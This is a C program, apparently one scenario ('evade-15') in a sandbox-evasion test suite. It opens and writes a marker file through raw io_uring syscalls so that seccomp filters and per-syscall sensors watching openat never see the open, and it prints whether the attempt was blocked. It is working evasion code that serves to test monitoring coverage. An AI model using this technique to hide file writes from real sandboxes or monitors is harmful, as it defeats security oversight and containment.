//
// uring — a write-intent open through io_uring. Scenario evade-15.
//
// One io_uring_enter call performs an IORING_OP_OPENAT inside the kernel.
// The openat syscall never happens, so a seccomp filter that selects openat
// cannot see the open, and the write through the returned descriptor is
// then invisible to every per-syscall sensor.
//
//   uring <marker-file>
//
// No liburing: the ring is set up through raw syscalls. The open flags ride
// in different sqe slots depending on the kernel, so the technique tries the
// two layouts and reports the one that worked.
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif

struct my_sq_ring_offsets {
    unsigned head, tail, ring_mask, ring_entries, flags, dropped, array, resv1;
    unsigned long long resv2;
};
struct my_cq_ring_offsets {
    unsigned head, tail, ring_mask, ring_entries, overflow, cqes, flags, resv1;
    unsigned long long resv2;
};
struct my_uring_params {
    unsigned sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle, features, wq_fd, resv[3];
    struct my_sq_ring_offsets sq_off;
    struct my_cq_ring_offsets cq_off;
};

static int ring_fd = -1;
static unsigned char *sq_ring, *cq_ring;
static struct io_uring_sqe *sqes;
static struct my_uring_params p;

static int setup_ring(void) {
    memset(&p, 0, sizeof p);
    ring_fd = (int)syscall(__NR_io_uring_setup, 4, &p);
    if (ring_fd < 0) {
        return -1;
    }
    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    sq_ring = mmap(NULL, sq_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring_fd,
                   IORING_OFF_SQ_RING);
    cq_ring = mmap(NULL, cq_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, ring_fd,
                   IORING_OFF_CQ_RING);
    sqes = mmap(NULL, p.sq_entries * sizeof(struct io_uring_sqe), PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQES);
    if (sq_ring == MAP_FAILED || cq_ring == MAP_FAILED || sqes == MAP_FAILED) {
        return -1;
    }
    return 0;
}

static int submit_open(const char *path, int flags_slot, int slot) {
    unsigned tail = *(volatile unsigned *)(sq_ring + p.sq_off.tail);
    memset(&sqes[tail & p.sq_off.ring_mask], 0, sizeof(struct io_uring_sqe));
    struct io_uring_sqe *sqe = &sqes[tail & p.sq_off.ring_mask];
    sqe->opcode = IORING_OP_OPENAT;
    sqe->fd = AT_FDCWD;
    sqe->addr = (unsigned long long)path;
    if (slot == 0) {
        /* flags in the open_flags union slot, mode in len */
        *(unsigned *)((char *)sqe + 28) = (unsigned)flags_slot;
        sqe->len = 0644;
    } else {
        /* flags in len, union slot left zero */
        sqe->len = (unsigned)flags_slot;
    }
    ((unsigned *)(sq_ring + p.sq_off.array))[tail & p.sq_off.ring_mask] = tail & p.sq_off.ring_mask;
    *(volatile unsigned *)(sq_ring + p.sq_off.tail) = tail + 1;
    unsigned flags = 1; /* IORING_ENTER_GETEVENTS */
    return (int)syscall(__NR_io_uring_enter, ring_fd, 1, 1, flags, NULL);
}

static int wait_completion(int *res) {
    unsigned *head = (unsigned *)(cq_ring + p.cq_off.head);
    unsigned *tail = (unsigned *)(cq_ring + p.cq_off.tail);
    while (*head == *tail) {
        usleep(1000);
    }
    struct io_uring_cqe *cqe =
        (struct io_uring_cqe *)(cq_ring + p.cq_off.cqes + (*head & p.cq_off.ring_mask) *
                                                          sizeof(struct io_uring_cqe));
    *res = cqe->res;
    (*head)++;
    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "usage: uring <marker-file>\n");
        return 2;
    }
    const char *marker = argv[1];
    if (setup_ring() < 0) {
        printf("ACTION uring blocked rc=setup errno=%d (%s)\n", errno, strerror(errno));
        return 0;
    }
    int res = -1;
    int tried = 0;
    submit_open(marker, O_WRONLY | O_CREAT | O_TRUNC, 0);
    wait_completion(&res);
    if (res < 0) {
        tried = 1;
        submit_open(marker, O_WRONLY | O_CREAT | O_TRUNC, 1);
        wait_completion(&res);
    }
    if (res < 0) {
        printf("ACTION uring blocked rc=%d errno=%d (%s) layout=%s\n", res, errno,
               strerror(-res), tried ? "len" : "open_flags");
        return 0;
    }
    ssize_t w = write(res, "uring\n", 6);
    printf("ACTION uring ok rc=%zd layout=%s\n", w, tried ? "len" : "open_flags");
    close(res);
    return 0;
}
